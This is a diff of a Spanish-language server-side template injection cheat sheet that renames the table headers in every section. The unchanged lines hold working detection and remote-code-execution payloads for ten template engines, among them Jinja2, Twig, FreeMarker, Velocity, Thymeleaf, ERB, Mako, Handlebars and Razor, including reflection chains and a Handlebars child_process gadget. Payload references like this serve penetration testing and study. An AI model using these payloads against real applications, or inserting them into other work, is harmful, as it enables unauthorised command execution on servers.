@@ -21,7 +21,7 @@ linked:
 
 ## Jinja2 (Python / Flask)
 
-| **Objetivo** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Detección | `{{7*7}}` | `49` |
 | Confirm Flask context | `{{config}}` | Dump del Flask config object. |
@@ -41,7 +41,7 @@ ___
 
 ## Twig (PHP / Symfony)
 
-| **Objetivo** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Detección | `{{7*'7'}}` | `7777777` (string multiplication confirma Twig vs Jinja2). |
 | Twig 1.x RCE | `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}` | Vector clásico. |
@@ -60,7 +60,7 @@ ___
 
 ## Smarty (PHP)
 
-| **Objetivo** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Detección | `{7*7}` | `49` (delimitador `{` simple). |
 | Smarty v2 RCE directo | `{system('id')}` | Función PHP directa. |
@@ -78,7 +78,7 @@ ___
 
 ## FreeMarker (Java)
 
-| **Objetivo** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Detección | `${7*7}` | `49` |
 | RCE clásico Execute | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` | Default class disponible. |
@@ -96,7 +96,7 @@ ___
 
 ## Velocity (Java)
 
-| **Objetivo** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Detección | `#set($x=7*7)$x` | `49` |
 | RCE clásico | `#set($e="exp") $e.getClass().forName("java.lang.Runtime").getMethod("exec",$e.getClass()).invoke($e.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")` | Reflection chain. |
@@ -111,7 +111,7 @@ ___
 
 ## Thymeleaf (Spring)
 
-| **Objetivo** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Detección | `${7*7}` o `[[${7*7}]]` | `49` solo en server-side context (`th:text`, `th:utext`). |
 | RCE via T() | `${T(java.lang.Runtime).getRuntime().exec('id')}` | SpringEL — funcional en `th:` attributes. |
@@ -127,7 +127,7 @@ ___
 
 ## ERB (Ruby / Rails)
 
-| **Objetivo** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Detección | `<%= 7*7 %>` | `49` |
 | RCE backtick | `<%= \`id\` %>` | Backtick = exec en Ruby. |
@@ -146,7 +146,7 @@ ___
 
 ## Mako (Python)
 
-| **Objetivo** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Detección | `${7*7}` | `49` |
 | RCE inline | `<%= os.popen('id').read() %>` | Bloque Python directo. |
@@ -164,7 +164,7 @@ ___
 
 ## Handlebars (Node.js)
 
-| **Objetivo** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Detección | `{{7*7}}` NO ejecuta | Handlebars es logic-less por default. |
 | RCE via require gadget | `{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require('child_process').exec('id');"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}` | Vector tradicional Handlebars (logic-less bypass). |
@@ -178,7 +178,7 @@ ___
 
 ## Razor (.NET)
 
-| **Objetivo** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Detección | `@(7*7)` | `49` (Razor inline). |
 | Detección bloque | `@{int x = 7*7;}` + reflejado | Bloque code. |
